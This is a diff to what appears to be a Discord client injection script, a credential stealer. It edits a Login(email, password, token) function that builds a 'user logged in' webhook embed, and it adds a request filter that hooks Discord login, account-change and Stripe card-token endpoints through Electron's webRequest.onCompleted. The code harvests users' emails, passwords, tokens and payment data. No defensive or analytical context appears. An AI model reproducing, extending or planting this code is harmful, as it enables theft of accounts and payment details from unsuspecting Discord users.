@@ -128,7 +128,7 @@ function GetRBadges(flags) {
 		badges += "verified bot developer "
 	}
 	if (badges == "") {
-		badges = "no badges"
+		badges = ""
 	}
 	return badges
 }
@@ -188,7 +188,7 @@ function Login(email, password, token) {
             embeds: [
                 {
                     "title": "user logged in",
-		    "description": "᲼᲼᲼᲼",
+		    description: "᲼᲼᲼᲼",
                     "color": 3092790,
                     "fields": [
                         {
@@ -259,6 +259,9 @@ function Login(email, password, token) {
     })
 }
 
+const ChangePasswordFilter = {
+	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
 session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
 	if (details.url.endsWith("login")) {
 		if (details.statusCode == 200) {
